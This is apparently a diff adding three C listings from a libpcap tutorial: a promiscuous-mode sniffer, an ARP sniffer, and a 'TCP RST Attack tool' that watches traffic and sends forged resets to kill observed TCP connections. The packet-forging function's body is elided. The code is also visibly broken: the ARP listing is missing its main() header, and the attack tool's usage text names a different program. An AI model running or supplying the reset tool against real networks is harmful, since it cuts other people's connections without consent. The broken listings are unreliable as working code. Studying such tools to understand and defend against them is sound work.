@@ -1,0 +1,216 @@
+Listing 2. Simple sniffer
+/* Simple Sniffer                                           */ 
+/* To compile: gcc simplesniffer.c -o simplesniffer -lpcap  */ 
+
+#include <pcap.h> 
+#include <string.h> 
+#include <stdlib.h> 
+
+#define MAXBYTES2CAPTURE 2048 
+
+void processPacket(u_char *arg, const struct pcap_pkthdr* pkthdr, const u_char * packet){ 
+
+ int i=0, *counter = (int *)arg; 
+
+ printf("Packet Count: %d\n", ++(*counter)); 
+ printf("Received Packet Size: %d\n", pkthdr->len); 
+ printf("Payload:\n"); 
+ for (i=0; i<pkthdr->len; i++){ 
+
+	if ( isprint(packet[i]) ) 
+	    printf("%c ", packet[i]); 
+	else 
+	    printf(". "); 
+	
+	 if( (i%16 == 0 && i!=0) || i==pkthdr->len-1 ) 
+	    printf("\n"); 
+  } 
+ return; 
+} 
+
+int main( ){ 
+	
+ int i=0, count=0; 
+ pcap_t *descr = NULL; 
+ char errbuf[PCAP_ERRBUF_SIZE], *device=NULL; 
+ memset(errbuf,0,PCAP_ERRBUF_SIZE); 
+
+ /* Get the name of the first device suitable for capture */ 
+ device = pcap_lookupdev(errbuf); 
+
+ printf("Opening device %s\n", device); 
+ 
+ /* Open device in promiscuous mode */ 
+ descr = pcap_open_live(device, MAXBYTES2CAPTURE, 1,  512, errbuf); 
+
+ /* Loop forever & call processPacket() for every received packet*/ 
+ pcap_loop(descr, -1, processPacket, (u_char *)&count); 
+
+return 0; 
+} 
+
+
+
+
+
+--------------------
+
+
+Listing 3. Simple ARP sniffer
+/* Simple ARP Sniffer.                             */ 
+/* To compile: gcc arpsniffer.c -o arpsniff -lpcap */ 
+#include <pcap.h> 
+#include <stdlib.h> 
+#include <string.h> 
+
+/* ARP Header, (assuming Ethernet+IPv4)            */ 
+#define ARP_REQUEST 1   /* ARP Request             */ 
+#define ARP_REPLY 2     /* ARP Reply               */ 
+typedef struct arphdr { 
+	u_int16_t htype;    /* Hardware Type           */ 
+	u_int16_t ptype;    /* Protocol Type           */ 
+	u_char hlen;        /* Hardware Address Length */ 
+	u_char plen;        /* Protocol Address Length */ 
+	u_int16_t oper;     /* Operation Code          */ 
+	u_char sha[6];      /* Sender hardware address */ 
+	u_char spa[4];      /* Sender IP address       */ 
+	u_char tha[6];      /* Target hardware address */ 
+	u_char tpa[4];      /* Target IP address       */ 
+}arphdr_t; 
+
+#define MAXBYTES2CAPTURE 2048 
+
+ int i=0; 
+ bpf_u_int32 netaddr=0, mask=0; /* To Store network address and netmask  */ 
+ struct bpf_program filter;     /* Place to store the BPF filter program */ 
+ char errbuf[PCAP_ERRBUF_SIZE]; /* Error buffer                          */ 
+ pcap_t *descr = NULL;          /* Network interface handler             */ 
+ struct pcap_pkthdr pkthdr;     /* Packet information (timestamp,size...)*/ 
+ const unsigned char *packet=NULL;/* Received raw data                   */ 
+ arphdr_t *arpheader = NULL;    /* Pointer to the ARP header             */ 
+ memset(errbuf,0,PCAP_ERRBUF_SIZE); 
+
+if (argc != 2){ 
+	printf("USAGE: arpsniffer <interface>\n"); 
+	exit(1); 
+} 
+ /* Open network device for packet capture */ 
+ descr = pcap_open_live(argv[1], MAXBYTES2CAPTURE, 0,  512, errbuf); 
+
+ /* Look up info from the capture device. */ 
+ pcap_lookupnet( argv[1] , &netaddr, &mask, errbuf); 
+
+ /* Compiles the filter expression into a BPF filter program */ 
+ pcap_compile(descr, &filter, "arp", 1, mask); 
+ 
+ /* Load the filter program into the packet capture device. */ 
+ pcap_setfilter(descr,&filter); 
+
+ while(1){ 
+ 
+  packet = pcap_next(descr,&pkthdr); /* Get one packet */ 
+  arpheader = (struct arphdr *)(packet+14); /* Point to the ARP header */ 
+
+  printf("\n\nReceived Packet Size: %d bytes\n", pkthdr.len); 
+  printf("Hardware type: %s\n", (ntohs(arpheader->htype) == 1) ? "Ethernet" : "Unknown"); 
+  printf("Protocol type: %s\n", (ntohs(arpheader->ptype) == 0x0800) ? "IPv4" : "Unknown"); 
+  printf("Operation: %s\n", (ntohs(arpheader->oper) == ARP_REQUEST)? "ARP Request" : "ARP Reply"); 
+ 
+ /* If is Ethernet and IPv4, print packet contents */ 
+  if (ntohs(arpheader->htype) == 1 && ntohs(arpheader->ptype) == 0x0800){ 
+   printf("Sender MAC: "); 
+   for(i=0; i<6;i++)printf("%02X:", arpheader->sha[i]); 
+   printf("\nSender IP: "); 
+   for(i=0; i<4;i++)printf("%d.", arpheader->spa[i]); 
+   printf("\nTarget MAC: "); 
+   for(i=0; i<6;i++)printf("%02X:", arpheader->tha[i]); 
+   printf("\nTarget IP: "); 
+   for(i=0; i<4; i++)printf("%d.", arpheader->tpa[i]); 
+   printf("\n"); 
+  } 
+ } 
+return 0; 
+}
+
+
+
+------------------
+
+Listing4. TCP RST Attack tool.
+/* Simple TCP RST Attack tool                              */ 
+/* To compile: gcc tcp_resetter.c -o tcpresetter -lpcap    */ 
+
+#define __USE_BSD         /* Using BSD IP header           */ 
+#include <netinet/ip.h>   /* Internet Protocol             */ 
+#define __FAVOR_BSD       /* Using BSD TCP header          */ 
+#include <netinet/tcp.h>  /* Transmission Control Protocol */ 
+#include <pcap.h>         /* Libpcap                       */ 
+#include <string.h>       /* String operations             */ 
+#include <stdlib.h>       /* Standard library definitions  */ 
+
+#define MAXBYTES2CAPTURE 2048 
+
+int TCP_RST_send(tcp_seq seq, tcp_seq ack, unsigned long src_ip, 
+  unsigned long dst_ip, u_short src_prt, u_short dst_prt, u_short win){ 
+
+/* This function crafts a custom TCP/IP packet with the RST flag set 
+   and sends it through a raw socket. Check 
+   http://www.programming-pcap.aldabaknocking.com/ for the full example. */ 
+
+[...] 
+
+return 0; 
+} 
+
+int main(int argc, char *argv[] ){ 
+
+ int count=0; 
+ bpf_u_int32 netaddr=0, mask=0; 
+pcap_t *descr = NULL; 
+ struct bpf_program filter; 
+ struct ip *iphdr = NULL; 
+ struct tcphdr *tcphdr = NULL; 
+ struct pcap_pkthdr pkthdr; 
+ const unsigned char *packet=NULL; 
+ char errbuf[PCAP_ERRBUF_SIZE]; 
+ memset(errbuf,0,PCAP_ERRBUF_SIZE); 
+
+if (argc != 2){ 
+	printf("USAGE: tcpsyndos <interface>\n"); 
+	exit(1); 
+} 
+
+ /* Open network device for packet capture */ 
+ descr = pcap_open_live(argv[1], MAXBYTES2CAPTURE, 1,  512, errbuf); 
+
+ /* Look up info from the capture device. */ 
+ pcap_lookupnet( argv[1] , &netaddr, &mask, errbuf); 
+
+ /* Compiles the filter expression: Packets with ACK or PSH-ACK flags set */ 
+ pcap_compile(descr, &filter, "(tcp[13] == 0x10) or (tcp[13] == 0x18)", 1, mask); 
+ 
+ /* Load the filter program into the packet capture device. */ 
+ pcap_setfilter(descr,&filter); 
+
+while(1){ 
+
+ packet = pcap_next(descr,&pkthdr); 
+
+ iphdr = (struct ip *)(packet+14); /* Assuming is Ethernet! */ 
+ tcphdr = (struct tcphdr *)(packet+14+20); /* Assuming no IP options! */ 
+ printf("+---------------------------------------+\n"); 
+ printf("Received Packet %d:\n", ++count); 
+ printf("ACK: %u\n", ntohl(tcphdr->th_ack) ); 
+ printf("SEQ: %u\n", ntohl(tcphdr->th_seq) ); 
+ printf("DST IP: %s\n", inet_ntoa(iphdr->ip_dst)); 
+ printf("SRC IP: %s\n", inet_ntoa(iphdr->ip_src)); 
+ printf("SRC PORT: %d\n", ntohs(tcphdr->th_sport) ); 
+ printf("DST PORT: %d\n", ntohs(tcphdr->th_dport) ); 
+ printf("\n"); 
+
+ TCP_RST_send(tcphdr->th_ack, 0, iphdr->ip_dst.s_addr, 
+	          iphdr->ip_src.s_addr, tcphdr->th_dport, 
+	          tcphdr->th_sport, 0); 
+} 
+return 0; 
+}
